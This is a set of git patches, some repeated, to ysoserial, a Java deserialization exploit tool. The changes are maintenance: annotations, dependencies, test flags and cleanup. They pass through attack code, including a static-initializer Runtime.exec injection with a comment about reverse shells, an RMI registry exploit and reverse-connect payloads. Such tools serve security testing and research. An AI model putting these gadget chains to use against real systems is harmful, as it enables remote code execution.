@@ -1,0 +1,626 @@
+File: src/test/java/ysoserial/test/payloads/PayloadsTest.java
+Patch:
+@@ -203,7 +203,7 @@ static Object deserializeWithDependencies ( byte[] serialized, final String[] de
+         File[] jars = dependencies.length > 0
+             ? Maven.configureResolver()
+                 .withMavenCentralRepo(true)
+-                .withRemoteRepo("jenkins", "http://repo.jenkins-ci.org/public/", "default")
++                .withRemoteRepo("jenkins", "https://repo.jenkins-ci.org/public/", "default")
+                 .resolve(dependencies).withoutTransitivity().asFile()
+             : new File[0];
+         URL[] urls = new URL[jars.length];
+
+File: src/main/java/ysoserial/payloads/util/Gadgets.java
+Patch:
+@@ -115,7 +115,7 @@ public static <T> T createTemplatesImpl ( final String command, Class<T> tplClas
+         // run command in static initializer
+         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
++            command.replace("\\", "\\\\").replace("\"", "\\\"") +
+             "\");";
+         clazz.makeClassInitializer().insertAfter(cmd);
+         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+
+File: src/main/java/ysoserial/payloads/FileUpload1.java
+Patch:
+@@ -41,7 +41,7 @@
+     "commons-fileupload:commons-fileupload:1.3.1",
+     "commons-io:commons-io:2.4"
+ } )
+-@PayloadTest(harness="ysoserial.test.payloads.FileUploadTest", precondition = "isApplicableJavaVersion")
++@PayloadTest(harness="ysoserial.test.payloads.FileUploadTest", precondition = "isApplicableJavaVersion", flaky = "possible race condition")
+ @Authors({ Authors.MBECHLER })
+ public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
+     public static boolean isApplicableJavaVersion() {
+
+File: src/main/java/ysoserial/payloads/Wicket1.java
+Patch:
+@@ -46,7 +46,7 @@
+  * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
+  * blue lobster
+  */
+-@PayloadTest(harness = "ysoserial.payloads.FileUploadTest")
++@PayloadTest(harness = "ysoserial.payloads.FileUploadTest", flaky="possible race condition")
+ @Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
+ @Authors({ Authors.JACOBAINES })
+ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
+
+File: src/main/java/ysoserial/payloads/annotation/PayloadTest.java
+Patch:
+@@ -9,11 +9,11 @@
+  */
+ @Retention(RetentionPolicy.RUNTIME)
+ public @interface PayloadTest {
+-
+     String skip() default "";
+-    
++
+     String precondition() default "";
+-    
++
+     String harness() default "";
+ 
++    String flaky() default "";
+ }
+
+File: src/main/java/ysoserial/secmgr/ExecCheckingSecurityManager.java
+Patch:
+@@ -6,6 +6,7 @@
+ import java.util.List;
+ import java.util.concurrent.Callable;
+ 
++// TODO per-thread secmgr
+ public class ExecCheckingSecurityManager extends SecurityManager {
+ 	public ExecCheckingSecurityManager() {
+ 		this(true);
+@@ -41,7 +42,6 @@ public void checkExec(final String cmd) {
+ 		}
+ 	};
+ 
+-
+ 	@SuppressWarnings("serial")
+ 	public static class ExecException extends RuntimeException {
+ 		private final String threadName = Thread.currentThread().getName();
+
+File: src/test/java/ysoserial/payloads/CommandExecTest.java
+Patch:
+@@ -16,7 +16,6 @@ public class CommandExecTest implements CustomTest {
+     @Override
+     public void run(Callable<Object> payload) throws Exception {
+         Assert.assertFalse("test file should not exist", testFile.exists());
+-        Exception err;
+         try {
+             payload.call();
+         } catch (Exception e) {
+
+File: src/main/java/ysoserial/secmgr/DelegateSecurityManager.java
+Patch:
+@@ -17,7 +17,7 @@ public void setSecurityManager(SecurityManager securityManager) {
+ 	}
+ 
+     @SuppressWarnings({"deprecation"})
+-    @Override
++    //@Override //fix for JDK10+
+ 	public boolean getInCheck() {
+ 		return getSecurityManager().getInCheck();
+ 	}
+
+File: src/main/java/ysoserial/secmgr/ExecCheckingSecurityManager.java
+Patch:
+@@ -6,6 +6,7 @@
+ import java.util.List;
+ import java.util.concurrent.Callable;
+ 
++// TODO per-thread secmgr
+ public class ExecCheckingSecurityManager extends SecurityManager {
+ 	public ExecCheckingSecurityManager() {
+ 		this(true);
+@@ -41,7 +42,6 @@ public void checkExec(final String cmd) {
+ 		}
+ 	};
+ 
+-
+ 	@SuppressWarnings("serial")
+ 	public static class ExecException extends RuntimeException {
+ 		private final String threadName = Thread.currentThread().getName();
+
+File: src/test/java/ysoserial/payloads/CommandExecTest.java
+Patch:
+@@ -16,7 +16,6 @@ public class CommandExecTest implements CustomTest {
+     @Override
+     public void run(Callable<Object> payload) throws Exception {
+         Assert.assertFalse("test file should not exist", testFile.exists());
+-        Exception err;
+         try {
+             payload.call();
+         } catch (Exception e) {
+
+File: src/test/java/ysoserial/payloads/PayloadsTest.java
+Patch:
+@@ -107,8 +107,8 @@ public static void testPayload ( final Class<? extends ObjectPayload<?>> payload
+             customDeserializer = ((CustomDeserializer)testHarness).getCustomDeserializer();
+         }
+ 
+-        ExecCheckingSecurityManager sm = new ExecCheckingSecurityManager();
+-        final byte[] serialized = sm.callWrapped(makeSerializeCallable(payloadClass, payloadCommand));
++        // TODO per-thread secmgr to enforce no detonation during deserialization
++        final byte[] serialized = makeSerializeCallable(payloadClass, payloadCommand).call();
+         Callable<Object> callable = makeDeserializeCallable(t, addlClassesForClassLoader, deps, serialized, customDeserializer);
+         if ( testHarness instanceof WrappedTest ) {
+             callable = ( (WrappedTest) testHarness ).createCallable(callable);
+
+File: src/main/java/ysoserial/exploit/RMIRegistryExploit.java
+Patch:
+@@ -35,7 +35,7 @@ public static void main(final String[] args) throws Exception {
+ 	public static void exploit(final Registry registry,
+ 			final Class<? extends ObjectPayload> payloadClass,
+ 			final String command) throws Exception {
+-		new ExecCheckingSecurityManager().wrap(new Callable<Void>(){public Void call() throws Exception {
++		new ExecCheckingSecurityManager().callWrapped(new Callable<Void>(){public Void call() throws Exception {
+ 			ObjectPayload payloadObj = payloadClass.newInstance();
+             Object payload = payloadObj.getObject(command);
+ 			String name = "pwned" + System.nanoTime();
+
+File: src/main/java/ysoserial/payloads/annotation/Authors.java
+Patch:
+@@ -17,6 +17,7 @@
+     String MATTHIASKAISER = "matthias_kaiser";
+     String GEBL = "gebl" ;
+     String JACOBAINES = "jacob-baines";
++    String JASINNER = "jasinner";
+ 
+     String[] value() default {};
+ 
+
+File: src/main/java/ysoserial/payloads/util/PayloadRunner.java
+Patch:
+@@ -1,6 +1,5 @@
+ package ysoserial.payloads.util;
+ 
+-import java.io.File;
+ import java.util.concurrent.Callable;
+ 
+ import ysoserial.Deserializer;
+@@ -19,7 +18,7 @@ public class PayloadRunner {
+ 
+     public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
+ 		// ensure payload generation doesn't throw an exception
+-		byte[] serialized = new ExecCheckingSecurityManager().wrap(new Callable<byte[]>(){
++		byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
+ 			public byte[] call() throws Exception {
+ 				final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();
+ 
+
+File: src/main/java/ysoserial/payloads/MozillaRhino1.java
+Patch:
+@@ -17,7 +17,7 @@
+ */
+ @SuppressWarnings({"rawtypes", "unchecked"})
+ @Dependencies({"rhino:js:1.7R2"})
+-@Authors({ Authors.MBECHLER })
++@Authors({ Authors.MATTHIASKAISER })
+ public class MozillaRhino1 implements ObjectPayload<Object> {
+ 
+     public Object getObject(final String command) throws Exception {
+
+File: src/main/java/ysoserial/payloads/URLDNS.java
+Patch:
+@@ -9,6 +9,7 @@
+ 
+ import ysoserial.payloads.annotation.Authors;
+ import ysoserial.payloads.annotation.Dependencies;
++import ysoserial.payloads.annotation.PayloadTest;
+ import ysoserial.payloads.util.PayloadRunner;
+ import ysoserial.payloads.util.Reflections;
+ 
+@@ -40,6 +41,7 @@
+  *
+  */
+ @SuppressWarnings({ "rawtypes", "unchecked" })
++@PayloadTest(skip = "true")
+ @Dependencies()
+ @Authors({ Authors.GEBL })
+ public class URLDNS implements ObjectPayload<Object> {
+
+File: src/main/java/ysoserial/payloads/Wicket1.java
+Patch:
+@@ -13,6 +13,7 @@
+ 
+ import ysoserial.payloads.annotation.Authors;
+ import ysoserial.payloads.annotation.Dependencies;
++import ysoserial.payloads.annotation.PayloadTest;
+ import ysoserial.payloads.util.PayloadRunner;
+ import ysoserial.payloads.util.Reflections;
+ 
+@@ -45,7 +46,8 @@
+  * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
+  * blue lobster
+  */
+-@Dependencies({"wicket-util:wicket-util:6.23"})
++@PayloadTest(harness = "ysoserial.payloads.FileUploadTest")
++@Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
+ @Authors({ Authors.JACOBAINES })
+ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
+ 
+
+File: src/main/java/ysoserial/payloads/CommonsCollections2.java
+Patch:
+@@ -6,6 +6,7 @@
+ import org.apache.commons.collections4.comparators.TransformingComparator;
+ import org.apache.commons.collections4.functors.InvokerTransformer;
+ 
++import ysoserial.payloads.annotation.Authors;
+ import ysoserial.payloads.annotation.Dependencies;
+ import ysoserial.payloads.util.Gadgets;
+ import ysoserial.payloads.util.PayloadRunner;
+@@ -24,7 +25,8 @@
+  */
+ 
+ @SuppressWarnings({ "rawtypes", "unchecked" })
+-@Dependencies({"org.apache.commons:commons-collections4:4.0"})
++@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
++@Authors({ Authors.FROHOFF })
+ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
+ 
+ 	public Queue<Object> getObject(final String command) throws Exception {
+
+File: src/main/java/ysoserial/payloads/CommonsCollections4.java
+Patch:
+@@ -11,6 +11,7 @@
+ import org.apache.commons.collections4.functors.ConstantTransformer;
+ import org.apache.commons.collections4.functors.InstantiateTransformer;
+ 
++import ysoserial.payloads.annotation.Authors;
+ import ysoserial.payloads.annotation.Dependencies;
+ import ysoserial.payloads.util.Gadgets;
+ import ysoserial.payloads.util.PayloadRunner;
+@@ -24,6 +25,7 @@
+  */
+ @SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
+ @Dependencies({"org.apache.commons:commons-collections4:4.0"})
++@Authors({ Authors.FROHOFF })
+ public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
+ 
+ 	public Queue<Object> getObject(final String command) throws Exception {
+
+File: src/main/java/ysoserial/payloads/CommonsCollections6.java
+Patch:
+@@ -6,6 +6,7 @@
+ import org.apache.commons.collections.functors.InvokerTransformer;
+ import org.apache.commons.collections.keyvalue.TiedMapEntry;
+ import org.apache.commons.collections.map.LazyMap;
++import ysoserial.payloads.annotation.Authors;
+ import ysoserial.payloads.annotation.Dependencies;
+ import ysoserial.payloads.util.PayloadRunner;
+ 
+@@ -33,6 +34,7 @@
+ */
+ @SuppressWarnings({"rawtypes", "unchecked"})
+ @Dependencies({"commons-collections:commons-collections:3.1"})
++@Authors({ Authors.MATTHIASKAISER })
+ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
+ 
+     public Serializable getObject(final String command) throws Exception {
+
+File: src/main/java/ysoserial/payloads/MozillaRhino1.java
+Patch:
+@@ -2,6 +2,7 @@
+ 
+ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+ import org.mozilla.javascript.*;
++import ysoserial.payloads.annotation.Authors;
+ import ysoserial.payloads.annotation.Dependencies;
+ import ysoserial.payloads.util.Gadgets;
+ import ysoserial.payloads.util.PayloadRunner;
+@@ -16,6 +17,7 @@
+ */
+ @SuppressWarnings({"rawtypes", "unchecked"})
+ @Dependencies({"rhino:js:1.7R2"})
++@Authors({ Authors.MBECHLER })
+ public class MozillaRhino1 implements ObjectPayload<Object> {
+ 
+     public Object getObject(final String command) throws Exception {
+@@ -63,4 +65,4 @@ public Object getObject(final String command) throws Exception {
+     public static void main(final String[] args) throws Exception {
+         PayloadRunner.run(MozillaRhino1.class, args);
+     }
+-}
+\ No newline at end of file
++}
+
+File: src/main/java/ysoserial/payloads/Jython1.java
+Patch:
+@@ -1,10 +1,10 @@
+ package ysoserial.payloads;
+ 
++import org.apache.commons.io.FileUtils;
+ import org.python.core.*;
+ 
+ import java.math.BigInteger;
+-import java.nio.file.Files;
+-import java.nio.file.Paths;
++import java.io.File;
+ import java.lang.reflect.Proxy;
+ import java.util.Arrays;
+ import java.util.Comparator;
+@@ -51,7 +51,7 @@ public PriorityQueue getObject(String command) throws Exception {
+         }
+ 
+         // Set payload parameters
+-        String python_code = new String(Files.readAllBytes(Paths.get(paths[0])));
++        String python_code = FileUtils.readFileToString(new File(paths[0]), "UTF-8");
+ 
+         // Python bytecode to write a file on disk and execute it
+         String code =
+
+File: src/main/java/ysoserial/payloads/Hibernate2.java
+Patch:
+@@ -49,7 +49,7 @@ public static String[] getDependencies () {
+    
+     public Object getObject ( String command ) throws Exception {
+         JdbcRowSetImpl rs = new JdbcRowSetImpl();
+-        rs.setDataSourceName("rmi: " + command);
++        rs.setDataSourceName(command);
+         return Hibernate1.makeCaller(rs,Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
+     }
+ 
+
+File: src/main/java/ysoserial/payloads/JRMPClient.java
+Patch:
+@@ -64,7 +64,7 @@ public Registry getObject ( final String command ) throws Exception {
+             host = command.substring(0, sep);
+             port = Integer.valueOf(command.substring(sep + 1));
+         }
+-        ObjID id = new ObjID(0); // RMI registry
++        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+         TCPEndpoint te = new TCPEndpoint(host, port);
+         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+         RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+@@ -76,6 +76,7 @@ public Registry getObject ( final String command ) throws Exception {
+ 
+ 
+     public static void main ( final String[] args ) throws Exception {
++        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
+         PayloadRunner.run(JRMPClient.class, args);
+     }
+ }
+
+File: src/test/java/ysoserial/payloads/JRMPReverseConnectTest.java
+Patch:
+@@ -51,7 +51,7 @@ public void run ( Callable<Object> payload ) throws Exception {
+ 
+ 
+     public String getPayloadArgs () {
+-        return "localhost:" + port;
++        return "rmi:localhost:" + port;
+     }
+ 
+ }
+
+File: src/main/java/ysoserial/payloads/Hibernate2.java
+Patch:
+@@ -49,7 +49,7 @@ public static String[] getDependencies () {
+    
+     public Object getObject ( String command ) throws Exception {
+         JdbcRowSetImpl rs = new JdbcRowSetImpl();
+-        rs.setDataSourceName("rmi: " + command);
++        rs.setDataSourceName(command);
+         return Hibernate1.makeCaller(rs,Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
+     }
+ 
+
+File: src/main/java/ysoserial/payloads/JRMPClient.java
+Patch:
+@@ -64,7 +64,7 @@ public Registry getObject ( final String command ) throws Exception {
+             host = command.substring(0, sep);
+             port = Integer.valueOf(command.substring(sep + 1));
+         }
+-        ObjID id = new ObjID(0); // RMI registry
++        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+         TCPEndpoint te = new TCPEndpoint(host, port);
+         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+         RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+@@ -76,6 +76,7 @@ public Registry getObject ( final String command ) throws Exception {
+ 
+ 
+     public static void main ( final String[] args ) throws Exception {
++        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
+         PayloadRunner.run(JRMPClient.class, args);
+     }
+ }
+
+File: src/test/java/ysoserial/payloads/JRMPReverseConnectTest.java
+Patch:
+@@ -51,7 +51,7 @@ public void run ( Callable<Object> payload ) throws Exception {
+ 
+ 
+     public String getPayloadArgs () {
+-        return "localhost:" + port;
++        return "rmi:localhost:" + port;
+     }
+ 
+ }
+
+File: src/main/java/ysoserial/GeneratePayload.java
+Patch:
+@@ -38,6 +38,7 @@ public static void main(final String[] args) {
+ 			final Object object = payload.getObject(command);
+ 			PrintStream out = System.out;
+ 			Serializer.serialize(object, out);
++			ObjectPayload.Utils.releasePayload(payload, object);
+ 		} catch (Throwable e) {
+ 			System.err.println("Error while generating or serializing payload");
+ 			e.printStackTrace();
+
+File: src/main/java/ysoserial/exploit/JRMPClient.java
+Patch:
+@@ -43,7 +43,7 @@ public static final void main ( final String[] args ) {
+         catch ( Exception e ) {
+             e.printStackTrace(System.err);
+         }
+-
++        Utils.releasePayload(args[2], payloadObject);
+     }
+ 
+     /**
+
+File: src/main/java/ysoserial/exploit/JRMPListener.java
+Patch:
+@@ -109,6 +109,7 @@ public static final void main ( final String[] args ) {
+             System.err.println("Listener error");
+             e.printStackTrace(System.err);
+         }
++        Utils.releasePayload(args[1], payloadObject);
+     }
+ 
+ 
+
+File: src/main/java/ysoserial/exploit/JSF.java
+Patch:
+@@ -60,6 +60,7 @@ public static void main ( String[] args ) {
+         catch ( Exception e ) {
+             e.printStackTrace(System.err);
+         }
++        Utils.releasePayload(args[1], payloadObject);
+ 
+     }
+ 
+
+File: src/main/java/ysoserial/exploit/JenkinsListener.java
+Patch:
+@@ -213,6 +213,7 @@ private static void exploit ( InetSocketAddress isa, long obj, int o1, long o2,
+             final Object object = payload.getObject(payloadArg);
+             objOut.writeObject(object);
+             os.flush();
++            ObjectPayload.Utils.releasePayload(payload, object);
+         }
+         catch ( Exception e ) {
+             e.printStackTrace(System.err);
+
+File: src/test/java/ysoserial/payloads/PayloadsTest.java
+Patch:
+@@ -154,7 +154,9 @@ private static Callable<byte[]> makeSerializeCallable ( final Class<? extends Ob
+             public byte[] call () throws Exception {
+                 ObjectPayload<?> payload = payloadClass.newInstance();
+                 final Object f = payload.getObject(command);
+-                return Serializer.serialize(f);
++                byte[] serialized =  Serializer.serialize(f);
++                ObjectPayload.Utils.releasePayload(payload, f);
++                return serialized;
+             }
+         };
+     }
+
+File: src/test/java/ysoserial/payloads/FileUploadTest.java
+Patch:
+@@ -31,7 +31,6 @@ public class FileUploadTest implements CustomTest {
+     public FileUploadTest () {
+         try {
+             source = File.createTempFile("fileupload-test", ".source");
+-            source.deleteOnExit();
+             repo = Files.createTempDir();
+         }
+         catch ( IOException e ) {
+@@ -63,6 +62,7 @@ public void run ( Callable<Object> payload ) throws Exception {
+                     f.delete();
+                 }
+                 this.repo.delete();
++                this.source.delete();
+             }
+         }
+     }
+
+File: src/main/java/ysoserial/GeneratePayload.java
+Patch:
+@@ -38,7 +38,7 @@ public static void main(final String[] args) {
+ 			final Object object = payload.getObject(command);
+ 			final ObjectOutputStream objOut = new ObjectOutputStream(System.out);
+ 			objOut.writeObject(object);
+-		} catch (Exception e) {
++		} catch (Throwable e) {
+ 			System.err.println("Error while generating or serializing payload");
+ 			e.printStackTrace();
+ 			System.exit(INTERNAL_ERROR_CODE);
+
+File: src/main/java/ysoserial/payloads/CommonsCollections1.java
+Patch:
+@@ -10,6 +10,7 @@
+ import org.apache.commons.collections.functors.InvokerTransformer;
+ import org.apache.commons.collections.map.LazyMap;
+ 
++import ysoserial.payloads.annotation.Dependencies;
+ import ysoserial.payloads.util.Gadgets;
+ import ysoserial.payloads.util.PayloadRunner;
+ import ysoserial.payloads.util.Reflections;
+@@ -37,6 +38,7 @@
+ 		commons-collections
+  */
+ @SuppressWarnings({"rawtypes", "unchecked"})
++@Dependencies({"commons-collections:commons-collections:3.1"})
+ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
+ 	
+ 	public InvocationHandler getObject(final String command) throws Exception {
+@@ -70,7 +72,7 @@ public InvocationHandler getObject(final String command) throws Exception {
+ 		return handler;
+ 	}
+ 	
+-	public static void main(final String[] args) {
++	public static void main(final String[] args) throws Exception {
+ 		PayloadRunner.run(CommonsCollections1.class, args);
+ 	}
+ }
+
+File: src/main/java/ysoserial/payloads/Groovy1.java
+Patch:
+@@ -6,6 +6,7 @@
+ import org.codehaus.groovy.runtime.ConvertedClosure;
+ import org.codehaus.groovy.runtime.MethodClosure;
+ 
++import ysoserial.payloads.annotation.Dependencies;
+ import ysoserial.payloads.util.Gadgets;
+ import ysoserial.payloads.util.PayloadRunner;
+ 
+@@ -25,6 +26,7 @@
+  */
+ 
+ @SuppressWarnings({ "rawtypes", "unchecked" })
++@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
+ public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
+ 
+ 	public InvocationHandler getObject(final String command) throws Exception {
+@@ -37,7 +39,7 @@ public InvocationHandler getObject(final String command) throws Exception {
+ 		return handler;
+ 	}
+ 
+-	public static void main(final String[] args) {
++	public static void main(final String[] args) throws Exception {
+ 		PayloadRunner.run(Groovy1.class, args);
+ 	}	
+ }
+
+File: src/test/java/ysoserial/ExecSerializable.java
+Patch:
+@@ -6,6 +6,9 @@
+ 
+ @SuppressWarnings("serial")
+ public class ExecSerializable implements Serializable {
++	private final String cmd;	
++	public ExecSerializable(String cmd) { this.cmd = cmd; }
++
+ 	private void readObject(final ObjectInputStream ois) {
+ 		try {
+ 			Runtime.getRuntime().exec("hostname");
+
+File: src/test/java/ysoserial/Throwables.java
+Patch:
+@@ -3,6 +3,6 @@
+ public class Throwables {
+ 	public static Throwable getInnermostCause(final Throwable t) {
+ 		final Throwable cause = t.getCause();
+-		return cause == null ? t : getInnermostCause(cause);  
++		return cause == null || cause == t ? t : getInnermostCause(cause);  
+ 	}		
+ }
+\ No newline at end of file
+
